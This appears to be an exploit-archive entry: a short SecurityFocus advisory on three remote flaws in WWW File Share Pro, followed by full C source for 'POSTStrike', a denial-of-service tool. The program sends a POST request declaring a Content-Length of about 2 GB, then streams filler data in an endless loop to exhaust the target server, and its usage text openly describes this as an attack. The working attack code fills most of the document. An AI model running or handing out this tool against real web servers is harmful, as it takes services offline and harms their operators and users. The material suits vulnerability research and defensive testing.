source: http://www.securityfocus.com/bid/9425/info
 
WWW File Share Pro has been reported prone to multiple remote vulnerabilities.
 
The first reported issue is that a remote attacker may employ the "upload" functionality of the vulnerable software to overwrite arbitrary files that are writable by the WWW File Share Pro process.
 
The second issue reported, may allow a remote user to deny service to the affected software. It has been reported that if WWW File Share Pro handles a POST request that contains excessive data it will consume system resources and leave the affected system unresponsive.
 
The final issue that has been reported regards the access control routines used to control access to directories that are protected by WWW File Share Pro. It has been reported that a remote attacker may invoke a specially crafted HTTP request for the target protected resource and in doing so may bypass access controls.

/*

by Luigi Auriemma

This source is covered by GNU/GPL

UNIX & WIN VERSION
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleepx  sleep
    #define MILLS   1           // 1 second = 1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #define sleepx  usleep
    #define MILLS   1000        // 1 second = 1000000
#endif




#define VER     "0.1"
#define PORT    80
#define SENDSZ  4096
#define REQSZ   512
#define TIMESEC 5
#define REQ     "POST / HTTP/1.0\r\n" \
                "Host: %s\r\n" \
                "Content-Length: 2147483647\r\n" \
                "\r\n"







u_long resolv(char *host);
void std_err(void);








int main(int argc, char *argv[]) {
    u_char  *sendme = 0,
            *req = 0,
            *host = 0,
            *tmp = 0,
            btype = 0;
    struct  sockaddr_in     peer;
    int     sd,
            err,
            reqlen,
            shiterr = 1,
            millisec = 0;
    u_long  tot;
    u_short port = PORT;
    clock_t start,
            stop;


    setbuf(stdout, NULL);

    fputs("\n"
        "POSTStrike "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <[http://]server[:port(%d)]>\n"
            "\n"
            "Options:\n"
            "-m NUM   milliseconds to wait each time after the sending of %d bytes of data\n"
            "         (default %d) (useful to limit your bandwith)\n"
            "-b       upload bandwidth: shows \"bytes per second\" instead of kilobytes\n"
            "\n\n"
            "Examples:\n"
            "  poststrike http://www.whatyouwant.com:8080\n"
            "  poststrike -m 500 127.0.0.1      (500 = half second)\n"
            "  poststrike -m 100 -t 127.0.0.1      (500 = half second)\n"
            "\n"
            "Note: is possible that NOT all the webservers allow this type of attack, so\n"
            "the tool will terminate itself if it receives 5 errors\n"
            "\n", argv[0], PORT, SENDSZ, MILLS);
        exit(1);
    }


    argc--;
    for(err = 1; err < argc; err++) {
        switch(argv[err][1]) {
            case 'm': millisec = atoi(argv[++err]); break;
            case 'b': btype = 1; break;
            default: {
                printf("\nError: Wrong argument (%s)\n", argv[err]);
                exit(1);
            }
        }
    }



#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


        /* URL, host, port, uri */
    host = strstr(argv[argc], "//");
    if(host) host += 2;
       else host = argv[argc];
    tmp = strchr(host, '/');
    if(tmp) *tmp = 0x00;
    tmp = strrchr(host, ':');
    if(tmp) {
        port = atoi(tmp + 1);
        *tmp = 0x00;
    }



    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;


    printf("\n"
        "Host:  %s\n"
        "Port:  %hu\n"
        "delay: %d ms\n"
        "\n", inet_ntoa(peer.sin_addr), port, millisec);

    millisec *= MILLS;



        /* alloc */

    req = malloc(REQSZ + 1);
    if(!req) std_err();
    reqlen = snprintf(
        req,
        REQSZ,
        REQ,
        host);



    sendme = malloc(SENDSZ + 1);
    if(!sendme) std_err();
    memset(sendme, 'a', SENDSZ);



    while(1) {

        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();

        fputs("Connecting...", stdout);
        err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
        if(err < 0) std_err();
        fputs("ok. Starting to send data\n", stdout);


        err = send(sd, req, reqlen, 0);
        if(err < 0) std_err();


        tot = 0;
        start = time(0);
        while(1) {
            err = send(sd, sendme, SENDSZ, 0);
            if(err < SENDSZ) {
                printf("\nAlert: connection terminated. If you receive other messages like this, it means you cannot use the POST attack versus this server (%d)\n\n", shiterr++);
                if(shiterr <= 5) {
                    break;
                } else {
                    fputs("\nError: sorry the server doesn't allow POST attacks\n\n", stdout);
                    close(sd);
                    exit(1);
                }
            }

            sleepx(millisec);


            tot += err;
            stop = time(0) - start;
            if(stop > TIMESEC) {
                if(btype) printf("%10lu bytes/s\r", tot / stop);
                    else printf("%10lu kb/s\r", (tot / stop) >> 10);
                tot = 0;
                start = time(0);
            }
        }

        close(sd);
    }


    return(0);
}







u_long resolv(char *host) {
    struct        hostent    *hp;
    u_long        host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n",
                host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }

    return(host_ip);
}






#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


